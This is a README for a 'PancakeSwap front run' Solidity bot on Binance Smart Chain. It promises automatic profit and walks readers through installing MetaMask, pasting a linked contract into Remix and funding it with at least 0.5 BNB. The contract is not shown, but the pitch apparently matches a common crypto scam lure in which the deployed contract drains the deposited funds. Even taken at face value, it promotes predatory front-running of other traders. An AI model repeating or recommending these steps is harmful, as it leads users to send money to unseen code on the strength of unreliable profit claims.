# PancakeSwap-Front-Run-Contract-Bot
PancakeSwap Front Run Contract Bot - a simple front run deployment in Solidity which automatically locates any liquidity added to a BSC token, immediately buy and sell at profit.  Current parameters of this contract is that 10% of profit automatically reenters the front-run pool, and automatically transacts back to your wallet 90% of the profit.  The remaining pool keeps front running for profit, until you transaction "Action" function in Remix  NOTE: This contract have been designed for Binance Smart Chain and won't work with Ethereum mainnet (On UniSwap for example)
a simple front run deployment in Solidity which automatically locates any liquidity added to a BSC token, immediately buy and sell at profit.

Current parameters of this contract is that 10% of profit automatically reenters the front-run pool, and automatically transacts back to your wallet 90% of the profit.  The remaining pool keeps front running for profit, until you transaction "Action" function in Remix

NOTE: This contract have been designed for Binance Smart Chain and won't work with Ethereum mainnet (On UniSwap for example)

Get metamask: 
https://metamask.io/download.html

Connect MetaMask to Binance Smart Chain: 
https://academy.binance.com/en/articl...

Access Remix: 
https://remix.ethereum.org/

Paste SmartContract in Remix: 
https://github.com/hukhho/PancakeSwap-Front-Run-Contract-Bot/blob/main/FrontRunComplete

////EDIT:

I got messages from people who didn't funded enough the contract to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. Gas fees average 0.006*2 (0.12) Its better when there is no burn, If you fund the contract with 0.2 BNB and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit. I recommend funding the contract with at least 0.5 just to make sure that won't happen.

https://www.youtube.com/watch?v=DZkIGQhEmyI
